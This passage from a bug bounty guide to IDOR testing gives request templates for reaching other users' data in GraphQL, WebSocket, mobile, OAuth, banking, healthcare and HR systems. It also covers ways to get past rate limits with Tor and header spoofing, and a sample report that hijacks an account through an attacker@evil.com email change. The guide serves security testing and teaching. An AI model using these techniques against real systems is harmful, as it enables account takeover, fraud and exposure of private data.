```graphql
{
  user1: user(id: "id-1") { email }
  user2: user(id: "id-2") { email }
  user3: user(id: "id-3") { email }
  # ... many more
}
```
Can enumerate many users in one request.

**6. Aliases for stealth:**
```graphql
{
  q1: user(id: "1") { email }
  q2: user(id: "2") { email }
  q3: user(id: "3") { email }
}
```
Same query repeated, may bypass rate limits.

**7. Tools:**
- **GraphQL Voyager**: Visualize schema
- **InQL**: Burp extension for GraphQL
- **GraphQLmap**: Test for various vulnerabilities
- **graphw00f**: Fingerprint GraphQL implementation

### Q32: How do you test for IDOR in WebSocket-based applications?
**A:**

**WebSocket IDOR testing:**

**1. Capture WebSocket frames in Burp:**
- Proxy → WebSockets history
- See all incoming/outgoing frames

**2. Identify object references:**
```json
{"action": "subscribe", "channel": "user_100_private"}
{"action": "get_message", "message_id": "msg_abc_123"}
{"action": "join_room", "room_id": "room_xyz"}
```

**3. Manipulate references:**
```json
Original: {"action": "subscribe", "channel": "user_100_private"}
Test:     {"action": "subscribe", "channel": "user_101_private"}
```

**4. Check what's received:**
- Do you get User 101's messages?
- Does WebSocket server allow cross-user subscriptions?

**5. Test common patterns:**

**Chat applications:**
```json
{"action": "join", "channel": "private-msg-userA-userB"}
{"action": "join", "channel": "private-msg-userC-userD"}  // Other users' chat
```

**Real-time dashboards:**
```json
{"action": "watch", "resource": "user_100_metrics"}
{"action": "watch", "resource": "user_101_metrics"}  // IDOR
```

**Notifications:**
```json
{"action": "subscribe_notifications", "user_id": 100}
{"action": "subscribe_notifications", "user_id": 101}  // IDOR
```

**6. Burp WebSocket testing:**
- Right-click frame → Send to Repeater
- Modify and resend
- Observe responses

### Q33: Testing IDOR in mobile applications
**A:**

**Mobile app IDOR testing:**

**1. Setup MITM proxy:**
- Burp Suite or mitmproxy
- Install Burp's CA certificate on device
- Configure WiFi proxy on device

**2. Capture API calls:**
- Use the app normally
- Burp captures all HTTP/HTTPS traffic
- Note all API endpoints

**3. Find ID-based requests:**
```
POST /api/v2/user/100/profile
GET /api/v2/orders/1001
PATCH /api/v2/preferences/{user_id}
```

**4. Test IDOR via Burp Repeater:**
- Modify IDs
- Resend through Burp
- See if app's backend allows access

**5. Common mobile app IDOR vectors:**

**Push notification subscription:**
```
POST /api/push/subscribe
{"device_token": "...", "user_id": 100}
```
Change user_id - get other user's notifications.

**File downloads:**
```
GET /api/files/{file_id}
```
Mobile apps download user-specific files - IDOR exposes others'.

**Profile pictures:**
```
GET /api/users/100/avatar
```
May serve from S3 without authorization - everyone's photos accessible.

**6. Bypass certificate pinning if present:**
- Use Frida to hook SSL pinning
- Or jailbroken device with SSL Kill Switch
- Re-test with full traffic visibility

**7. Reverse engineering for hidden endpoints:**
- Decompile APK (apktool, jadx)
- Search strings for `/api/`, `http`
- Find hidden/admin endpoints not seen during normal use

### Q34: IDOR in OAuth flows - how to test?
**A:**

**OAuth has unique IDOR patterns:**

**1. Client ID manipulation:**
```
POST /oauth/authorize
client_id=user_a_client_id&...

Change to:
client_id=user_b_client_id
```
If allowed, you've impersonated User B's OAuth client.

**2. Redirect URI manipulation:**
- Apps often allow flexible redirect URIs
- Test with attacker-controlled URI

**3. Authorization code IDOR:**
```
POST /oauth/token
code=user_a_auth_code&client_id=user_a_client&redirect_uri=...
```
- Try other users' auth codes
- If accepted, you have their access token

**4. Refresh token IDOR:**
```
POST /oauth/token
grant_type=refresh_token&refresh_token=user_a_refresh_token
```
Refresh tokens are sensitive - IDOR here = persistent access.

**5. Token introspection:**
```
POST /oauth/introspect
token=any_users_token
```
Some implementations let you check any token - info disclosure.

**6. Resource server access:**
```
GET /api/oauth-protected-resource
Authorization: Bearer USER_A_ACCESS_TOKEN
```
With access token, test if you can access other users' resources via IDs.

### Q35: How does GraphQL change IDOR testing patterns?
**A:**

**Key differences:**

**1. Single endpoint, many queries:**
- All operations through `/graphql`
- Can't filter by URL path
- Must analyze query content

**2. Batching for efficient enumeration:**
```graphql
{
  user1: user(id: "1") { ... }
  user2: user(id: "2") { ... }
  ...
  user100: user(id: "100") { ... }
}
```
One request = 100 IDOR tests.

**3. Field-level authorization (more granular than REST):**
```graphql
{
  user(id: "my-id") {
    name           # Authorized
    email          # Authorized for self
    creditCard     # Should NOT be authorized
  }
}
```

**4. Nested objects creating IDOR cascades:**
```graphql
{
  user(id: "my-id") {
    organization {     # IDOR: My org
      employees {      # IDOR: All employees
        salary         # Sensitive data
      }
    }
  }
}
```

Authorization needs to happen at every level.

**5. Mutations as IDOR:**
```graphql
mutation {
  deleteUser(id: "other-user") { success }
  transferOwnership(documentId: "other-doc", newOwner: "me") { ok }
}
```

**6. Subscriptions for real-time IDOR:**
```graphql
subscription {
  messageReceived(channelId: "private-channel-other-user") {
    content
  }
}
```

**7. Schema introspection helps and hurts:**
- Helps: See all available IDOR targets
- Hurts: Production should disable introspection

### Q36: How to test for IDOR via filename/file ID manipulation?
**A:**

**File-based IDOR scenarios:**

**1. Direct file access:**
```
GET /uploads/users/100/document.pdf
```
Change to:
```
GET /uploads/users/101/document.pdf
```
If accessible, IDOR.

**2. File ID instead of path:**
```
GET /api/files/12345/download
```
Enumerate file IDs.

**3. Tokenized URLs (signed):**
```
GET /downloads?file=user_100_invoice.pdf&token=abc123
```

Tests:
- Remove token, does it still work?
- Tokens reusable across users?
- Token validates file, not requester?

**4. AWS S3 direct access:**
```
https://bucket.s3.amazonaws.com/users/100/file.pdf
https://bucket.s3.amazonaws.com/users/101/file.pdf
```
Often misconfigured buckets allow direct access.

**5. CDN-cached files:**
- Some apps cache files publicly even when access should be restricted
- Test direct CDN URLs

**6. Filename guessing:**
```
GET /attachments/passport.jpg     ← Yours
GET /attachments/passport_2.jpg   ← Someone else's?
GET /attachments/john_smith.pdf   ← Predictable filename
```

**7. Path traversal IDOR combo:**
```
GET /files/100/../101/document.pdf
```

### Q37: What's the IDOR testing approach for multi-tenant SaaS apps?
**A:**

**Multi-tenant SaaS = High IDOR risk:**

**1. Identify tenant identifiers:**
- URLs: `/tenants/{tenantId}/`, `/orgs/{orgId}/`
- Headers: `X-Tenant-ID`, `X-Org-ID`
- Subdomains: `acme.app.com`, `globex.app.com`
- JWT claims: `tenant_id` in token

**2. Create accounts in 2 tenants:**
- Tenant A: Acme Corp
- Tenant B: Globex Corp
- Note all IDs

**3. Test cross-tenant access:**

**Direct ID manipulation:**
```
GET /api/tenants/{tenant_a_id}/users
As user from tenant_b, change tenant_id to tenant_a_id
```

**Header manipulation:**
```
X-Tenant-ID: tenant_a   ← As user from tenant_b
```

**Subdomain hopping:**
- Logged into acme.app.com
- Visit globex.app.com same auth
- Does it work?

**JWT modification:**
```
Original JWT: {"tenant_id": "tenant_b", ...}
Modify: {"tenant_id": "tenant_a", ...}
```

**4. Test admin functions:**
- Tenant admin can manage their tenant
- Can they cross over to manage other tenants?

**5. Search and filter parameters:**
```
GET /api/users?tenant=tenant_a   ← Cross-tenant access?
```

**6. Common multi-tenant IDOR endpoints:**
- User lists
- Billing/payment info
- Documents
- Activity logs
- API keys (high value!)
- Integration settings

**7. Real-world example:**
- Apollo (2018 breach via IDOR)
- Bug bounty: $1000-10000+ per cross-tenant IDOR finding
- High-impact, well-paid

### Q38: How does authentication context affect IDOR testing?
**A:**

**Different auth contexts to test:**

**1. Unauthenticated:**
- No token, no cookies
- Should be: 401 Unauthorized
- IDOR finding: If endpoint returns data without auth

**2. Authenticated as User A:**
- Standard testing
- Should access only User A's resources
- IDOR finding: Can access User B's resources

**3. Authenticated as User B (same role):**
- Switch sessions
- Confirm role doesn't matter

**4. Authenticated as Admin:**
- Should access more
- But not necessarily everything
- IDOR finding: Admin can access cross-tenant data inappropriately

**5. Expired/invalid token:**
- Use expired JWT
- Should be rejected
- IDOR finding: Some endpoints accept anyway

**6. No CSRF token:**
- Authentication via cookie alone
- Some endpoints may work without CSRF protection
- IDOR combined with CSRF = worse

**7. Different OAuth scopes:**
- Token with limited scope
- Should restrict access
- IDOR finding: Scopes ignored

**8. Service account credentials:**
- API keys vs user tokens
- Service accounts often over-privileged
- IDOR finding: API key bypasses user-level authorization

### Q39: How do you test IDOR in single-page applications (SPAs)?
**A:**

**SPA IDOR challenges and approach:**

**1. Find all API endpoints:**
- Network tab in DevTools
- Burp Suite proxy
- View bundled JavaScript files

**2. JavaScript analysis:**
- View source of SPA bundle
- Look for API path patterns:
```javascript
const API_BASE = '/api/v2';
fetch(`${API_BASE}/users/${userId}/profile`)
fetch(`${API_BASE}/orders/${orderId}`)
```
- Identifies all API calls

**3. Source map analysis:**
- If source maps available (`/main.js.map`)
- Reveals original source code structure
- Easier to find IDOR opportunities

**4. State management inspection:**
- Redux DevTools, Vuex DevTools
- See current state
- Find IDs stored in state

**5. Local storage / Session storage:**
- Check for stored IDs/references
- Sometimes app caches sensitive data

**6. Service Worker analysis:**
- Some SPAs use service workers
- May cache responses with IDs
- Could allow access to cached data

**7. WebSocket integration:**
- Modern SPAs often use WebSockets
- Real-time data with potential IDOR

**8. Testing approach:**
- Use SPA normally as User A
- Note all API calls and IDs
- Switch to User B
- Use Burp Repeater to manually test User A's IDs

### Q40: What patterns suggest authorization is missing entirely?
**A:**

**Red flags for missing authorization:**

**1. Endpoint returns data without authentication:**
```
GET /api/users/100/profile (no token)
Response: 200 OK with user data
```

**2. Sequential IDs accessible without errors:**
```
/api/users/1 → User 1's data
/api/users/2 → User 2's data
/api/users/3 → User 3's data
```
No 403s = no authorization checks.

**3. Same response for owned vs not-owned:**
- Your data: 200 with content
- Other user's data: 200 with content
- Identical handling = no ownership check

**4. Admin endpoints accessible by regular users:**
```
/admin/users → 200 (should be 403)
```

**5. Different verbs have different protection:**
```
GET /api/users/100   → 403 Forbidden
PUT /api/users/100   → 200 OK (broken)
DELETE /api/users/100 → 200 OK (broken!)
```

**6. Internal/debug endpoints exposed:**
```
/debug/dump
/internal/admin
/api/v0/legacy
```

**7. Missing audit logging:**
- Accessing other users' data
- No alerts triggered
- No audit log entry
- Authorization likely missing

**8. Old/deprecated endpoints:**
```
/api/v1/users/100  → Has authorization
/api/v0/users/100  → Missing authorization (legacy)
```

### Q41: How to test IDOR with Burp Intruder effectively?
**A:**

**Burp Intruder for IDOR enumeration:**

**1. Capture base request:**
- Capture request with your own ID
- Send to Intruder (Ctrl+I)

**2. Set positions:**
```
GET /api/users/§100§/profile
```
Single position around your user ID.

**3. Choose attack type:**
- **Sniper** - For single position enumeration
- **Pitchfork** - If multiple correlated positions

**4. Configure payloads:**

**Payload type 1: Numbers (sequential)**
- Type: Numbers
- From: 1, To: 10000
- Step: 1

**Payload type 2: Numbers (random)**
- Type: Numbers
- Random format
- Useful when IDs not strictly sequential

**Payload type 3: UUID list**
- Type: Runtime file
- Load file with collected UUIDs

**Payload type 4: Numbers (range with format)**
```
Format: USR_{N}
N from 1 to 9999
Generates: USR_1, USR_2, ... USR_9999
```

**5. Configure result analysis:**

**Grep - Match:**
- Add patterns indicating success:
  - "email"
  - "phone"
  - Other PII patterns
- Filter results

**Grep - Extract:**
- Extract specific data
- E.g., extract email from response
- See what's leaking

**6. Run attack:**
- Click "Start attack"
- Free version is slower
- Pro version multi-threaded

**7. Analyze:**
- Sort by Status Code (200 = success)
- Sort by Length (different = different content)
- Sort by Response Time

**8. Verify:**
- Sample successful responses
- Confirm IDOR vs. accidental success
- Manually verify a few findings

### Q42: How do you handle rate limiting during IDOR enumeration?
**A:**

**Rate limiting strategies:**

**1. Throttle requests:**
- Burp Intruder → Resource Pool
- Set "Maximum concurrent requests": 1
- Add delay between requests: 1-5 seconds

**2. Random delays:**
- Avoid pattern detection
- Random 500ms-2000ms between requests

**3. Rotate IP addresses:**
- Proxychains + Tor
- Multiple SOCKS proxies
- Residential proxies (paid)

**4. User-Agent rotation:**
- Burp Intruder → Payload set 2: User-Agent
- Or use extension for automatic rotation

**5. Distributed testing:**
- Multiple test systems
- Each tests different ID ranges
- Combine results

**6. Header manipulation:**
- `X-Forwarded-For`: Spoof source IP (sometimes bypasses rate limits)
- `X-Real-IP`: Same effect

**7. Authentication rotation:**
- Multiple test accounts
- Switch every X requests

**8. Time-based:**
- Spread testing over hours/days
- Stay under per-hour rate limits

**9. Specific endpoints first:**
- Some endpoints have stricter limits than others
- Test less-protected endpoints first

**10. If account-based limits:**
- Don't test from primary account
- Create disposable test accounts

**11. Bug bounty etiquette:**
- Don't DoS the target
- Identify rate limit, stay below
- Coordinate with security team if needed

### Q43: How to find IDOR in REST API documentation?
**A:**

**Approach for API docs review:**

**1. Find API documentation:**
- `/docs`, `/swagger`, `/api-docs`
- `/openapi.json`, `/swagger.json`
- `/redoc`, `/graphql` (introspection)
- Look in robots.txt, sitemap
- GitHub search for org name

**2. Identify ID-bearing endpoints:**

**OpenAPI/Swagger example:**
```yaml
/users/{userId}:
  get:
    parameters:
      - name: userId
        in: path
        required: true
```

Every `{...Id}` parameter is potential IDOR.

**3. Review authorization sections:**
- Look for `securitySchemes`
- Some endpoints may have `security: []` (no auth required)
- Documentation may say "admin only" but no enforcement

**4. Look for sensitive data endpoints:**
- `/users/{id}/payment-methods`
- `/orders/{id}/details`
- `/files/{id}/download`
- Higher impact = priority for testing

**5. Check for undocumented endpoints:**
- Compare docs to actual JS/mobile app calls
- Undocumented endpoints often less secure

**6. Look for batch endpoints:**
- `/users/bulk-get?ids=1,2,3,4`
- Easy enumeration target

**7. Webhook configurations:**
- `/webhooks/{userId}` endpoints
- Configuration changes can be IDOR

**8. Test ALL endpoints:**
- Documentation guides scope
- But test more than what's documented
- Try common patterns: `/admin/`, `/internal/`, `/debug/`

### Q44: Testing IDOR via parameter pollution
**A:**

**HTTP Parameter Pollution (HPP) for IDOR:**

**1. Duplicate parameters:**
```
GET /api/users?id=100&id=101
```
Server behavior varies:
- Take first: id=100 (your own)
- Take last: id=101 (other user)
- Combine: id=100,101
- Error: 400 Bad Request

If "last wins" → IDOR via HPP.

**2. Array parameters:**
```
GET /api/users?id[]=100&id[]=101
```

**3. Multiple in POST:**
```
POST /api/profile
{
  "userId": 100,
  "userId": 101
}
```
JSON parsers handle differently - test all.

**4. Different parameter sources:**
```
GET /api/users/100/profile?userId=101
```
- URL says user 100
- Query says user 101
- Server takes which?

**5. Body vs URL:**
```
PATCH /api/users/100
{"id": 101, "name": "New name"}
```

**6. Multi-part forms:**
```
Content-Disposition: form-data; name="userId"
100
Content-Disposition: form-data; name="userId"
101
```

**7. Header conflicts:**
```
X-User-ID: 100
X-User-ID: 101
```

**Testing approach:**
- For each ID parameter, try polluting
- Note server's behavior
- Find behavior allowing other user access

### Q45: How does response handling reveal IDOR?
**A:**

**Indicators in responses:**

**1. Status codes:**
- 200 OK with data = potential IDOR
- 200 OK with empty data = endpoint exists, may need different ID format
- 404 Not Found = ID doesn't exist (consistent across users)
- 403 Forbidden = Access control working (yay!)
- 401 Unauthorized = Authentication issue (different)
- 500 Internal Server Error = May leak info

**2. Response time analysis:**
```
Your ID (100): 50ms (data retrieved)
Other ID (101): 50ms (data retrieved - IDOR!)
Other ID (101): 5ms (immediate denial - working)
Other ID (101): 200ms (longer = maybe checking, then denied)
```

Different timing patterns reveal authorization logic.

**3. Response size analysis:**
```
GET /api/users/100/profile → 2500 bytes (your data)
GET /api/users/101/profile → 2500 bytes (other user's data - IDOR!)
GET /api/users/101/profile → 50 bytes ("Access denied")
GET /api/users/999999/profile → 80 bytes ("Not found")
```

**4. Response content analysis:**
- Look for unique identifiers in response
- Email addresses, names, IDs in JSON
- Confirms whose data you're seeing

**5. HTTP headers:**
- `X-User-ID` in response (some apps echo)
- `ETag` differences
- `Set-Cookie` updates

**6. Differential responses:**
- 200 OK + empty array = endpoint exists, no records
- 200 OK + full data = potential IDOR if different user
- 404 = consistent denial
- Mixed = inconsistent (often signals bug)

### Q46: How to chain IDOR with other vulnerabilities?
**A:**

**Common IDOR chains:**

**Chain 1: IDOR + Information Disclosure**
1. IDOR reveals list of all users (`/api/users` with no auth)
2. Use leaked user IDs to access individual profiles
3. Full database enumeration

**Chain 2: IDOR + SQL Injection**
1. IDOR allows access to admin endpoint
2. Admin endpoint has SQL injection
3. Full database compromise

**Chain 3: IDOR + Mass Assignment**
1. IDOR allows updating other users' profiles
2. Mass assignment lets you set role=admin
3. Privilege escalation to admin

**Chain 4: IDOR + Password Reset**
1. IDOR allows initiating password reset for any user
2. IDOR allows reading reset token
3. Account takeover for any user

**Chain 5: IDOR + Open Redirect**
1. IDOR allows modifying user's email
2. Set victim's email to attacker-controlled domain
3. Trigger password reset
4. Receive reset link
5. Account takeover

**Chain 6: IDOR + Server-Side Request Forgery**
1. IDOR allows modifying user's webhook URL
2. SSRF via webhook to internal services
3. Access cloud metadata
4. Extract AWS credentials

**Chain 7: IDOR + XSS**
1. IDOR allows modifying other user's profile
2. Insert XSS payload in their profile
3. Other users viewing profile get XSSed
4. Stored XSS via IDOR

**Chain 8: IDOR + IDOR cascade**
1. IDOR on `/api/users/{id}` exposes user details
2. Details include `wallet_id` for each user
3. IDOR on `/api/wallets/{id}` exposes balances
4. Wallet details include `transaction_history_url`
5. IDOR on transaction URLs exposes transactions
6. Multi-step data exfiltration

### Q47: How do you test for IDOR in invitation/sharing features?
**A:**

**Invitation/sharing IDOR patterns:**

**1. Sharing endpoints:**
```
POST /api/documents/{doc_id}/share
Body: {"email": "attacker@gmail.com", "role": "edit"}
```

Tests:
- Share documents you don't own
- Invite users to other tenants
- Modify share roles

**2. Acceptance endpoints:**
```
POST /api/invitations/{invite_id}/accept
```

Tests:
- Accept invitations sent to other users
- Use other users' invitation tokens

**3. Invitation links:**
```
GET /invite?token=abc123&user=victim@gmail.com
```

Tests:
- Reuse invitation tokens
- Modify email parameter
- Predict tokens

**4. Collaboration features:**
```
POST /api/projects/{project_id}/members
Body: {"userId": 999, "role": "admin"}
```

Tests:
- Add yourself as admin to others' projects
- Remove other admins
- Change roles

**5. Bulk sharing:**
```
POST /api/documents/bulk-share
Body: {
  "document_ids": [1,2,3,4,5],
  "share_with": ["user@example.com"]
}
```

Test sharing documents you don't own.

**6. Public link generation:**
```
POST /api/documents/{doc_id}/generate-public-link
```

If accessible for documents you don't own:
- Generate public link for others' docs
- Share without authorization

### Q48: How do you test IDOR in approval/workflow systems?
**A:**

**Workflow IDOR tests:**

**1. Approval requests:**
```
POST /api/approvals/{approval_id}/approve
POST /api/approvals/{approval_id}/reject
POST /api/approvals/{approval_id}/comment
```

Tests:
- Approve other users' requests
- Reject approvals you shouldn't
- Comment on others' workflows

**2. Workflow steps:**
```
GET /api/workflows/{workflow_id}/steps
POST /api/workflows/{workflow_id}/advance
```

Tests:
- View other workflows
- Advance workflows you don't control
- Skip approval steps

**3. Status changes:**
```
PATCH /api/requests/{request_id}/status
Body: {"status": "approved"}
```

Tests:
- Change status of others' requests
- Self-approve your own pending request

**4. Workflow assignment:**
```
POST /api/workflows/{id}/assign
Body: {"assignee_id": 999}
```

Tests:
- Reassign workflows to yourself
- Assign others to undesirable workflows

**5. Audit trail manipulation:**
```
GET /api/workflows/{id}/history
DELETE /api/workflows/{id}/history/{event_id}
```

If allowed - cover tracks of unauthorized actions.

### Q49: IDOR in shopping cart and checkout?
**A:**

**E-commerce IDOR vectors:**

**1. Cart manipulation:**
```
GET /api/carts/{cart_id}
PATCH /api/carts/{cart_id}/items
DELETE /api/carts/{cart_id}/items/{item_id}
```

Tests:
- View other users' carts (creepy + competitive intel)
- Modify their cart contents
- Delete items from their cart

**2. Address manipulation:**
```
GET /api/users/{user_id}/addresses
PATCH /api/addresses/{address_id}
```

Tests:
- View shipping addresses (PII)
- Modify others' addresses (redirect deliveries!)

**3. Payment method:**
```
GET /api/users/{user_id}/payment-methods
POST /api/payment-methods/{method_id}/charge
```

Tests:
- View saved payment methods
- Charge others' cards!

**4. Coupon application:**
```
POST /api/carts/{cart_id}/apply-coupon
Body: {"coupon_code": "DISCOUNT50"}
```

Test applying to others' carts.

**5. Order modification:**
```
PATCH /api/orders/{order_id}/cancel
GET /api/orders/{order_id}/invoice
```

Tests:
- Cancel others' orders
- View invoices (PII, items purchased)

**6. Refund manipulation:**
```
POST /api/orders/{order_id}/refund
```

Refund others' orders (where does money go?)

**7. Gift card application:**
```
POST /api/users/{user_id}/gift-cards/apply
Body: {"code": "GIFT123"}
```

Apply gift cards to others' accounts.

### Q50: How to test IDOR in messaging/chat applications?
**A:**

**Messaging app IDOR tests:**

**1. Direct message access:**
```
GET /api/conversations/{conversation_id}/messages
```

Tests:
- Access conversations you're not part of
- Read private DMs

**2. Group/channel access:**
```
GET /api/channels/{channel_id}/messages
POST /api/channels/{channel_id}/join
```

Tests:
- Join private channels
- Read private group messages

**3. Message modification:**
```
PATCH /api/messages/{message_id}
DELETE /api/messages/{message_id}
```

Tests:
- Edit others' messages (impersonation!)
- Delete others' messages

**4. Attachment access:**
```
GET /api/attachments/{attachment_id}/download
```

Often hosted on S3 - test direct access:
```
https://attachments.s3.amazonaws.com/conv-100/file.pdf
```

**5. Member list:**
```
GET /api/channels/{channel_id}/members
```

Privacy concern - shouldn't see private channel members.

**6. Read receipts:**
```
POST /api/messages/{message_id}/mark-read
```

Mark others' messages as read - causes confusion.

**7. Reactions:**
```
POST /api/messages/{message_id}/react
DELETE /api/messages/{message_id}/reactions/{reaction_id}
```

React/unreact on behalf of others.

**8. Search across conversations:**
```
GET /api/search?q=password&scope=all-conversations
```

May search across conversations you don't own.

### Q51-80: [Continuing with advanced IDOR scenarios, real-world examples, defensive testing, etc.]

### Q51: Examples of IDOR in financial applications
**A:**

**Banking/Fintech IDOR scenarios:**

**1. Account balance enumeration:**
```
GET /api/accounts/{account_number}/balance
```
Enumerate account numbers, get balances.

**2. Transaction history:**
```
GET /api/accounts/{account_id}/transactions
```
View others' financial history.

**3. Transfer initiation:**
```
POST /api/transfers
Body: {
  "from_account": "1234567890",  ← Should be yours
  "to_account": "9876543210",
  "amount": 1000
}
```
Test transferring from others' accounts!

**4. Loan application:**
```
GET /api/loans/{loan_id}
PATCH /api/loans/{loan_id}/approve
```

**5. Investment portfolio:**
```
GET /api/portfolios/{portfolio_id}/holdings
```

**6. Card management:**
```
PATCH /api/cards/{card_id}/freeze
PATCH /api/cards/{card_id}/limit
```

Freeze others' cards (denial of service).
Modify others' spending limits.

**7. Beneficiary management:**
```
POST /api/accounts/{account_id}/beneficiaries
Body: {"name": "Attacker", "account": "attacker_acc"}
```

Add yourself as beneficiary to others' accounts.

**8. KYC document access:**
```
GET /api/users/{user_id}/kyc-documents
```

ID cards, passports, proof of address - massive PII.

**Real example:** First American Financial (2019) - 885M documents via sequential ID IDOR.

### Q52: IDOR in healthcare applications
**A:**

**Healthcare/HIPAA-regulated IDOR:**

**1. Patient records:**
```
GET /api/patients/{patient_id}
GET /api/patients/{patient_id}/medical-history
GET /api/patients/{patient_id}/prescriptions
```

HIPAA violations - massive penalties.

**2. Appointments:**
```
GET /api/appointments/{appointment_id}
PATCH /api/appointments/{appointment_id}
```

Cancel others' appointments (denial of care).

**3. Lab results:**
```
GET /api/lab-results/{result_id}
```

Sensitive personal health info.

**4. Insurance information:**
```
GET /api/patients/{id}/insurance
```

Insurance policy numbers - identity theft risk.

**5. Provider notes:**
```
GET /api/visits/{visit_id}/notes
```

Doctor's private notes.

**6. Mental health records:**
```
GET /api/patients/{id}/mental-health
```

Extra-sensitive subset of medical records.

**Impact:**
- HIPAA fines: $100-$50,000 per violation
- Annual maximum: $1.5M
- Plus civil suits
- Plus reputation
- Plus regulatory scrutiny

### Q53: IDOR in HR/employee systems
**A:**

**HR application IDOR:**

**1. Employee records:**
```
GET /api/employees/{id}/personal
GET /api/employees/{id}/compensation
```

Salaries, addresses, SSNs.

**2. Performance reviews:**
```
GET /api/reviews/{id}
PATCH /api/reviews/{id}/rating
```

Modify others' reviews (sabotage).

**3. Leave/PTO management:**
```
POST /api/employees/{id}/leave-request
```

Request leave on others' behalf.

**4. Payroll:**
```
GET /api/payroll/{employee_id}
PATCH /api/payroll/{employee_id}/bank-account
```

Change others' direct deposit accounts - paycheck theft!

**5. Benefits enrollment:**
```
POST /api/employees/{id}/benefits/enroll
```

Modify others' benefits.

**6. Tax documents:**
```
GET /api/tax-documents/{id}
```

W-2s, 1099s - tax fraud risk.

**7. Org chart:**
```
GET /api/employees/{id}/reports
```

Reveals organizational structure.

### Q54: How does IDOR testing differ in dev/staging vs production?
**A:**

**Dev/Staging:**

**Pros:**
- Test data only - safe to enumerate
- Often more lax security
- More findings
- Document for production

**Cons:**
- Not exactly like production
- Findings may not apply
- Different ID ranges/formats

**Approach:**
- Use generous enumeration
- Test admin/internal endpoints
- Try debug parameters
- Less worried about rate limits

**Production:**

**Pros:**
- Real bugs
- Real impact
- Real value

**Cons:**
- Be careful with enumeration
- Real users affected
- Real data at stake
- May trigger alerts

**Approach:**
- Controlled enumeration (small samples)
- Don't modify others' data
- Read-only testing primarily
- Test on your own accounts when possible
- Stop if seeing real data unexpectedly

**Bug bounty production rules:**
- Don't enumerate beyond proof
- Don't access more than needed for PoC
- Report immediately
- Don't share data

### Q55: How to test for "second-order" IDOR?
**A:**

**Second-order IDOR** = IDOR that doesn't appear directly but emerges through chained operations.

**Example 1: Cached references**

**Step 1:** Endpoint returns success but data appears later:
```
POST /api/jobs/start  → Returns: {"job_id": "abc-123"}
```

**Step 2:** Later, polling:
```
GET /api/jobs/abc-123/status  → Returns job details
```

**Step 3:** Test:
```
GET /api/jobs/other-job-id/status  → IDOR?
```

The IDOR is on the second-order endpoint, not the original.

**Example 2: Reference via different identifier**

**Step 1:** Login flow:
```
POST /login → Returns refresh_token: "xyz-token"
```

**Step 2:** Later:
```
POST /refresh
Body: {"refresh_token": "xyz-token"}
```

**Step 3:** Test:
```
POST /refresh
Body: {"refresh_token": "another-users-token"}
```

If accepted → second-order IDOR.

**Example 3: Asynchronous processing**

**Step 1:** Submit request:
```
POST /api/export-data
Body: {"format": "csv", "type": "users"}
Returns: {"export_id": "export-123"}
```

**Step 2:** Download:
```
GET /api/exports/export-123/download
```

**Step 3:** Test other export IDs:
```
GET /api/exports/export-456/download
```

If you can download others' exports → second-order IDOR.

---

## SECTION C: REPORTING, REMEDIATION & EDGE CASES (Q56-100)

### Q56: How to write a detailed IDOR bug bounty report?
**A:**

**Template for IDOR report:**

```markdown
# Title
Critical IDOR in Account Settings API leading to mass PII exposure

## Severity
Critical (CVSS 9.1)

## CVSS Breakdown
AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N

## Summary
The /api/users/{userId}/settings endpoint does not validate that 
the authenticated user matches the userId parameter, allowing 
any authenticated user to read and modify any other user's 
account settings, including email and notification preferences.

## Affected Endpoint
- Method: GET, PATCH
- Path: /api/users/{userId}/settings
- Authentication: Required (any valid user)

## Steps to Reproduce

### Setup
- User A: john@example.com (User ID: 100)
- User B: jane@example.com (User ID: 101)

### Reproduction

1. Login as User A:
   POST /api/login
   {"email": "john@example.com", "password": "..."}
   Returns session token for User A

2. View User A's settings (legitimate):
   GET /api/users/100/settings
   Authorization: Bearer <user_a_token>
   Returns: 200 OK with User A's settings ✓

3. Attempt IDOR - view User B's settings:
   GET /api/users/101/settings
   Authorization: Bearer <user_a_token>
   Returns: 200 OK with User B's settings ✗

4. Modify User B's email:
   PATCH /api/users/101/settings
   Authorization: Bearer <user_a_token>
   {"email": "attacker@evil.com"}
   Returns: 200 OK ✗

5. User B's email is now attacker@evil.com
6. Attacker can request password reset
7. Reset link sent to attacker@evil.com
8. Attacker takes over User B's account

## Impact

### Confidentiality
- Read access to all users' email addresses (PII)
- Notification preferences (behavioral data)
- Account creation dates
- Last login timestamps

### Integrity
- Modify any user's email
- Change notification settings
- Modify privacy settings

### Availability
- Lock users out by changing email
- Disable notifications
- Modify settings to break account

### Business Impact
- Mass account takeover possible
- GDPR violation (unauthorized access to personal data)
- Customer trust destruction
- Regulatory penalties

## Proof of Concept

[Embed video/screenshots showing each step]

## Exploitation Scale
- Sequential user IDs from 1 to 100,000+
- Single script can iterate all users
- Estimated: ~50,000 active users affected
- Data exposed: Email, name, DOB, preferences for each

## Mitigation

### Immediate (24-48 hours)
1. Add authorization check in /api/users/{userId}/settings endpoint:
   - Verify request user ID matches authenticated user
   - Or verify user has admin role
   - Return 403 if mismatch

### Code example:
```python
def get_user_settings(user_id, current_user):
    if user_id != current_user.id and not current_user.is_admin:
        raise PermissionDenied()
    return User.objects.get(id=user_id).settings
```

### Long-term
1. Audit all /api/users/{userId}/* endpoints for similar issues
2. Implement centralized authorization middleware
3. Add automated tests for authorization on each endpoint
4. Security training for engineers
5. Code review checklist updated
6. SAST tools configured to catch missing authorization

## References
- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP Top 10 2021: A01 - Broken Access Control
- OWASP API Top 10: API1 - BOLA

## Timeline
- 2026-06-01 09:00 UTC: Vulnerability discovered
- 2026-06-01 09:30 UTC: Reported to security@example.com
- 2026-06-01 10:00 UTC: Acknowledged by team
- 2026-06-01 16:00 UTC: Fix deployed
- 2026-06-02: Verification of fix
```

### Q57: Common false positives in IDOR testing
**A:**

**Watch out for these false positives:**

**1. Public endpoints (intentionally):**
- `/api/users/{id}/public-profile`
- Designed to be public (like Twitter profiles)
- Returning data isn't IDOR if intentional

**2. Cached responses:**
- Your own session may receive cached data
- Always test with cleared cache/different session

**3. Error messages masking auth:**
- 200 OK with `{"error": "not authorized"}` body
- Looks like success, actually denial
- Always check response content

**4. Empty data responses:**
- 200 OK with `{"data": []}` empty array
- Endpoint exists but filtered
- May not be IDOR

**5. Shared resources:**
- Published documents
- Public projects
- Multi-owner objects (shared with you)

**6. Indirect references:**
- `/api/my-orders` returns YOUR orders
- Different from `/api/orders/{id}` IDOR
- "My" prefix endpoints often safe

**7. Different user, but you have permission:**
- Admin role legitimately sees all users
